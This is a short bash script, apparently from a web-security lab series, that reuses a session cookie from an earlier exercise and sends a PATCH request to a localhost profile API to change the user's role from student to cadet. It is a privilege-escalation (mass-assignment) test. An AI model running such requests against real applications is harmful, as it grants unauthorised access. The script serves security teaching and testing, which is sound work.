
#!/usr/bin/env bash
set -euo pipefail

URL="http://localhost:4942/api/profile"

COOKIE_FILE="../02_weak_password_change_or_reset_functionalities/cookies.txt"

# Check that the cookie file exists
if [[ ! -f "$COOKIE_FILE" ]]; then
    echo "[ERROR] Cookie file not found: $COOKIE_FILE"
    exit 1
fi

echo "[*] Testing role modification: student -> cadet"

curl --silent --show-error \
    --include \
    --request PATCH \
    --url "$URL" \
    --cookie "$COOKIE_FILE" \
    --header "Content-Type: application/json" \
    --data '{"role":"cadet"}'
